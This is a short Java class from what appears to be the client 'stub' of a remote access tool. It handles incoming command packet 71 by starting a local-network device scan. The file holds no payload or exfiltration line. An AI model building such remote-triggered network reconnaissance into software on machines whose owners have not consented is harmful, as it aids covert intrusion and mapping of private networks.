package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Lan;

public class Packet71LocalNetworkDevices extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Lan().start();
	}

}
